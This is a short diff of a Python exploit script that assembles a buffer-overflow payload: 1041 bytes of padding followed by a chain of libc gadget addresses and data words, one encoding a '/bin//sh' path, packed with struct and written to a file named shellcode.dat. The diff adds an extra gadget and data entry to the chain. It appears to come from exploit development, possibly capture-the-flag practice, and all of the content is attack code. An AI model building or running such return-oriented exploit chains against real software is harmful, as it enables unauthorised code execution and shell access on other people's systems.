@@ -12,8 +12,8 @@ d3 = 0x00
 g3 = LIBC_OFFSET + 0x1f940 + 0xb8993 + 0xe
 d4 = 0x222f62696e2f2f736822 #integer out of range for 'q' format code
 d5 = 0x00
-
-g4 = LIBC_OFFSET + 0x1f940 + 0x132bae + 0xe
+g4 = LIBC_OFFSET + 0x1f940 + 0x18f503 + 0xf
+g5 = LIBC_OFFSET + 0x1f940 + 0x132bae + 0xe
 
 
 shellcode = 'A'*(1041)
@@ -25,7 +25,9 @@ shellcode += struct.pack('<q', d2)
 shellcode += struct.pack('<q', d3)
 shellcode += struct.pack('<q', g3)
 shellcode += struct.pack('<q', d4)
+shellcode += struct.pack('<q', d5)
 shellcode += struct.pack('<q', g4)
+shellcode += struct.pack('<q', g5)
 
 print ("shellcode: "+ shellcode)
 with open("shellcode.dat", "wb") as f:
